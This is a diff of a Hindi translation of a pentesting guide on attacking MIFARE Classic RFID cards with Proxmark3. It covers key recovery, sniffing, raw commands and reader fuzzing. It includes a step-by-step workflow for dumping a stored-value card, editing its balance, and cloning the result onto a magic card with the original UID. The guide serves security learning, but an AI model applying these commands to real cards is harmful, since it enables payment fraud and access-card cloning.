@@ -2,17 +2,18 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## Proxmark3 के साथ RFID Systems पर हमला
+## Proxmark3 से RFID Systems पर हमला करना
 
-actively maintained RRG/Iceman Proxmark3 client और matching firmware को install करें, फिर उस build के साथ command syntax की पुष्टि करें, क्योंकि नीचे दिखाए गए पुराने commands बदल चुके हो सकते हैं।<sup>[[1]](#references)[[5]](#references)</sup>
+सक्रिय रूप से maintained RRG/Iceman Proxmark3 client और उससे मेल खाने वाला firmware install करें। फिर उस build के साथ command syntax की पुष्टि करें, क्योंकि नीचे दिए गए पुराने commands बदल चुके हो सकते हैं।<sup>[[1]](#references)[[5]](#references)</sup>
 
-### MIFARE Classic 1KB पर हमला
+### MIFARE Classic 1KB पर हमला करना
 
-MIFARE Classic 1K में **16 sectors** होते हैं, और प्रत्येक sector में **16 bytes** के **4 blocks** होते हैं। Manufacturer block 0 में UID/manufacturer data होता है और genuine NXP cards पर यह read-only होता है; special clone या “magic” cards में इसे rewrite करने की अनुमति हो सकती है।<sup>[[1]](#references)[[2]](#references)</sup>\
-प्रत्येक sector को access करने के लिए आपको **2 keys** (**A** और **B**) चाहिए, जो **प्रत्येक sector के block 3** में stored होती हैं (sector trailer)। Sector trailer में **access bits** भी stored होते हैं, जो 2 keys का उपयोग करके **प्रत्येक block** की **read और write** permissions निर्धारित करते हैं।\
-उदाहरण के लिए, यदि आपको पहली key पता हो तो read permissions और दूसरी key पता हो तो write permissions देने के लिए 2 keys उपयोगी होती हैं।
+MIFARE Classic 1K में **16 sectors** होते हैं, और हर sector में **16 bytes** के **4 blocks** होते हैं। Genuine NXP cards में manufacturer block 0 में UID/manufacturer data होता है और यह read-only होता है; special clone या “magic” cards में इसे rewrite किया जा सकता है।<sup>[[1]](#references)[[2]](#references)</sup>\
+हर sector को access करने के लिए आपको **2 keys** (**A** और **B**) चाहिए, जो हर sector के **block 3** (sector trailer) में stored होती हैं। Sector trailer में **access bits** भी होते हैं, जो 2 keys का उपयोग करके **हर block** पर **read और write** permissions देते हैं।\
+उदाहरण के लिए, अगर आपको पहली key पता है तो उससे read permissions और दूसरी key पता है तो उससे write permissions देना उपयोगी हो सकता है।
 
 कई attacks किए जा सकते हैं
+
 ```bash
 proxmark3> hf mf #List attacks
 
@@ -31,11 +32,13 @@ proxmark3> hf mf eset 01 000102030405060708090a0b0c0d0e0f # Write those bytes to
 proxmark3> hf mf eget 01 # Read block 1
 proxmark3> hf mf wrbl 01 B FFFFFFFFFFFF 000102030405060708090a0b0c0d0e0f # Write to the card
 ```
-Proxmark3 **eavesdropping** जैसे अन्य actions करने की अनुमति देता है, जिससे **Tag to Reader communication** को सुनकर sensitive data खोजने का प्रयास किया जा सकता है। इस card में आप communication को केवल sniff करके उपयोग की गई key calculate कर सकते हैं, क्योंकि इस्तेमाल किए गए **cryptographic operations weak** हैं और plain तथा cipher text जानने पर आप इसकी गणना कर सकते हैं (`mfkey64` tool)।<sup>[[3]](#references)</sup>
 
-#### MiFare Classic में stored-value abuse के लिए quick workflow
+Proxmark3 से **Tag to Reader communication** को **eavesdrop** करने जैसी अन्य कार्रवाइयाँ भी की जा सकती हैं, ताकि संवेदनशील डेटा खोजा जा सके। इस कार्ड में आप केवल communication को sniff करके इस्तेमाल की गई key की गणना कर सकते हैं, क्योंकि **इस्तेमाल किए गए cryptographic operations कमज़ोर हैं** और plain तथा cipher text पता होने पर आप इसकी गणना कर सकते हैं (`mfkey64` tool)।<sup>[[3]](#references)</sup>
 
-जब terminals Classic cards पर balances store करते हैं, तो एक typical end-to-end flow इस प्रकार होता है:<sup>[[4]](#references)</sup>
+#### Stored-value के दुरुपयोग के लिए MiFare Classic का त्वरित वर्कफ़्लो
+
+जब terminals, Classic cards पर balances store करते हैं, तो आम तौर पर end-to-end flow इस प्रकार होता है:<sup>[[4]](#references)</sup>
+
 ```bash
 # 1) Recover sector keys and dump full card
 proxmark3> hf mf autopwn
@@ -49,13 +52,14 @@ proxmark3> hf mf cload -f modified.bin
 # 4) Clone original UID so readers recognize the card
 proxmark3> hf mf csetuid -u <original_uid>
 ```
+
 नोट्स
 
-- `hf mf autopwn` nested/darkside/HardNested-style attacks को orchestrate करता है, keys recover करता है, और client dumps folder में dumps बनाता है।<sup>[[1]](#references)</sup>
-- Block 0/UID लिखना केवल magic gen1a/gen2 cards पर काम करता है। Normal Classic cards में UID read-only होता है।<sup>[[2]](#references)</sup>
-- कई deployments Classic "value blocks" या simple checksums का उपयोग करते हैं। Editing के बाद सभी duplicated/complemented fields और checksums consistent होने सुनिश्चित करें।<sup>[[4]](#references)</sup>
+- `hf mf autopwn` nested/darkside/HardNested-style attacks को orchestrate करता है, keys recover करता है और client dumps folder में dumps बनाता है।<sup>[[1]](#references)</sup>
+- Block 0/UID लिखना केवल magic gen1a/gen2 cards पर काम करता है। सामान्य Classic cards में UID read-only होता है।<sup>[[2]](#references)</sup>
+- कई deployments में Classic "value blocks" या simple checksums का इस्तेमाल होता है। Editing के बाद सुनिश्चित करें कि सभी duplicated/complemented fields और checksums consistent हों।<sup>[[4]](#references)</sup>
 
-एक higher-level methodology और mitigations यहां देखें:
+ऊँचे स्तर की methodology और mitigations के लिए देखें:
 
 {{#ref}}
 pentesting-rfid.md
@@ -63,31 +67,35 @@ pentesting-rfid.md
 
 ### Raw Commands
 
-IoT systems कभी-कभी **nonbranded या noncommercial tags** का उपयोग करते हैं। इस स्थिति में, आप tags को **custom raw commands भेजने** के लिए Proxmark3 का उपयोग कर सकते हैं।
+IoT systems में कभी-कभी **nonbranded या noncommercial tags** इस्तेमाल होते हैं। ऐसे में, आप tags को custom **raw commands भेजने** के लिए Proxmark3 का इस्तेमाल कर सकते हैं।
+
 ```bash
 proxmark3> hf search UID : 80 55 4b 6c ATQA : 00 04
 SAK : 08 [2]
 TYPE : NXP MIFARE CLASSIC 1k | Plus 2k SL1
-proprietary non iso14443-4 card found, RATS not supported
-No chinese magic backdoor command detected
-Prng detection: WEAK
-Valid ISO14443A Tag Found - Quitting Search
+  proprietary non iso14443-4 card found, RATS not supported
+  No chinese magic backdoor command detected
+  Prng detection: WEAK
+  Valid ISO14443A Tag Found - Quitting Search
 ```
-इस जानकारी के साथ आप card और उससे communicate करने के तरीके के बारे में information खोजने का प्रयास कर सकते हैं। Proxmark3 इस तरह के raw commands भेजने की अनुमति देता है: `hf 14a raw -p -b 7 26`
+
+इस जानकारी के साथ, आप कार्ड और उससे संवाद करने के तरीके के बारे में जानकारी खोजने की कोशिश कर सकते हैं। Proxmark3 raw commands भेजने की सुविधा देता है, जैसे: `hf 14a raw -p -b 7 26`
 
 ### Scripts
 
-Proxmark3 software में पहले से **automation scripts** की एक list मौजूद होती है, जिनका उपयोग आप simple tasks करने के लिए कर सकते हैं। पूरी list प्राप्त करने के लिए `script list` command का उपयोग करें। इसके बाद, script के नाम के साथ `script run` command का उपयोग करें:
+Proxmark3 सॉफ़्टवेयर में **automation scripts** की एक preloaded सूची होती है, जिनका उपयोग आप सरल कार्य करने के लिए कर सकते हैं। पूरी सूची पाने के लिए `script list` command का उपयोग करें। इसके बाद, `script run` command के साथ script का नाम दें:
+
 ```
 proxmark3> script run mfkeys
 ```
-आप **tag readers** को **fuzz** करने के लिए एक script बना सकते हैं। किसी **valid card** के डेटा को कॉपी करके, बस एक **Lua script** लिखें जो एक या अधिक random **bytes** को **randomize** करे और हर iteration में जाँच करे कि **reader crashes** होता है या नहीं।
+
+आप tag readers को **fuzz** करने के लिए एक script बना सकते हैं। **valid card** का data कॉपी करने के बाद, बस एक **Lua script** लिखें जो एक या अधिक random **bytes** को **randomize** करे और हर iteration में जाँच करे कि **reader crash** होता है या नहीं।
 
 ## References
 
-- [1] [Proxmark3 विकी: HF MIFARE](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Mifare)
-- [2] [Proxmark3 विकी: HF Magic cards](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Magic-cards)
+- [1] [Proxmark3 wiki: HF MIFARE](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Mifare)
+- [2] [Proxmark3 wiki: HF मैजिक कार्ड](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Magic-cards)
 - [3] [MIFARE Classic Crypto1 पर NXP का बयान](https://www.mifare.net/en/products/chip-card-ics/mifare-classic/security-statement-on-crypto1-implementations/)
-- [4] [KioSoft Stored Value में NFC card vulnerability exploitation (SEC Consult)](https://sec-consult.com/vulnerability-lab/advisory/nfc-card-vulnerability-exploitation-leading-to-free-top-up-kiosoft-payment-solution/)
-- [5] [RRG/Iceman Proxmark3 — Linux installation](https://github.com/RfidResearchGroup/proxmark3/blob/master/doc/md/Installation_Instructions/Linux-Installation-Instructions.md)
+- [4] [KioSoft Stored Value में NFC कार्ड की vulnerability का exploitation (SEC Consult)](https://sec-consult.com/vulnerability-lab/advisory/nfc-card-vulnerability-exploitation-leading-to-free-top-up-kiosoft-payment-solution/)
+- [5] [RRG/Iceman Proxmark3 — Linux इंस्टॉलेशन](https://github.com/RfidResearchGroup/proxmark3/blob/master/doc/md/Installation_Instructions/Linux-Installation-Instructions.md)
 {{#include ../../banners/hacktricks-training.md}}
